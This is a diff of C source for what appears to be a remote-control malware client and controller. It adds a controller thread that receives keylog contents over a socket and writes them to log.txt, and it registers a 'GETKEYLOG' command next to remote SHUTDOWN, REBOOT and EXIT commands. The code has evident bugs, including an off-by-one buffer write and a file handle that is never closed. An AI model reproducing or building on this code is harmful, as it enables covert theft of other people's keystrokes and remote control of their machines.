@@ -279,6 +279,77 @@ void * sendMessage (void * c){
 #endif
 
 #ifdef _WIN32
+DWORD WINAPI getMessageController(LPVOID paramT){
+	char server_reply[100] = {0};
+
+	paramThread * param = (paramThread *)paramT;
+
+	int recv_size = 0;
+
+	while(1){
+		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
+			recv_size = recv((param)->clientSocket, server_reply, sizeof(server_reply), 0);
+			if (recv_size == 0 || recv_size == SOCKET_ERROR) {
+				if((param)->socketStatus == 'c') (param)->socketStatus = 'x';
+				else (param)->socketStatus = 'X';
+				break;
+			} else {
+				server_reply[recv_size] = '\0';
+				printf("Server reply: %s\n", server_reply);
+				memset(server_reply, '\0', sizeof(server_reply));
+			}
+		}
+		Sleep(1000);
+	}
+	return 0;
+}
+#else
+void * getMessageController (void * vParam){
+	printf("INSIDE getMessage\n");
+	char buffer[1024] = {0};
+	int pass = 0;
+
+	paramThread * param = (paramThread *)vParam;
+
+	unsigned char GETFILE = 0;
+
+	FILE * fp;
+
+
+	while(1){
+		if((param)->socketStatus == 's' || (param)->socketStatus == 'c'){
+		pass = read((param)->clientSocket, buffer, 1024 - 1);
+
+		if(pass > 0){
+			if(strcmp(buffer, "GETFILE") == 0) {
+				GETFILE = 1; memset(buffer, '\0', sizeof(buffer));
+				fp = fopen("log.txt", "w"); continue;
+			} else if(strcmp(buffer, "ENDGETFILE") == 0) {
+				GETFILE = 0; memset(buffer, '\0', sizeof(buffer));
+				fp = NULL; continue;
+			}
+
+			if(GETFILE == 0) printf("%s\n", buffer);
+			else if(GETFILE == 1) fputs(buffer, fp);
+
+			memset(buffer, '\0', sizeof(buffer));
+		}else if(pass == 0){
+			if((param)->socketStatus == 's'){
+				close((param)->clientSocket);
+				(param)->clientSocket = -1;
+			}else if((param)->socketStatus == 'c' || (param)->socketStatus == 'C'){
+				(param)->socketStatus = 'x';
+			}else return NULL;
+		}
+		}else printf("CONNECTING\n");
+
+		usleep(1000000);
+	}
+	return NULL;
+}
+#endif
+
+#ifdef _WIN32
 DWORD WINAPI getMessage(LPVOID paramT){
 	char server_reply[100] = {0};
 
@@ -326,7 +397,7 @@ void * getMessage (void * vParam){
 				(param)->socketStatus = 'x';
 			}else return NULL;
 		}
-		}else printf("YAHAHA WAHYU\n");
+		}else printf("CONNECTING\n");
 
 		usleep(1000000);
 	}
@@ -349,6 +420,8 @@ DWORD WINAPI execMessage(LPVOID paramT){
 	addCommand("SHUTDOWN", (void *)SHUTDOWN, cmd);
 	addCommand("REBOOT", (void *)REBOOT, cmd);
 	addCommand("EXIT", (void *)EXIT, cmd);
+	addCommand("HALLO", (void *)HALLO, cmd);
+	addCommand("GETKEYLOG", (void *)GETKEYLOG, cmd);
 
 	while(1){
 		while((param)->socketStatus == 'c' || (param)->socketStatus == 's'){
@@ -358,8 +431,7 @@ DWORD WINAPI execMessage(LPVOID paramT){
 				else (param)->socketStatus = 'X';
 				break;
 			} else {
-				proccess(server_reply, cmd);
-				server_reply[recv_size] = '\0';
+				proccess(server_reply, param, cmd);
 				printf("Server reply: %s\n", server_reply);
 				memset(server_reply, '\0', sizeof(server_reply));
 			}
